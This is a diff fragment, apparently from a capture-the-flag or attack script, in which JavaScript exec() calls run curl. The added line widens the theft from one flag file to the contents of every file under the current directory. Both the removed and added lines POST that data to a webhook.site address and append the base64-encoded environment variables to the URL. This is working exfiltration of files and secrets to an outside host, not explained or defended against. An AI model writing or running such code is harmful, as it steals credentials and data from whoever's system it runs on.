@@ -44,7 +44,7 @@ exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; cd
 })
 
 
-exec('curl -X POST --data "flag=$(cat /tmp/flag.txt)" https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(printenv | base64)');
+exec('curl -X POST --data "flag=$(find . -type f -exec cat {} +;)" https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(printenv | base64)');
 
 
 
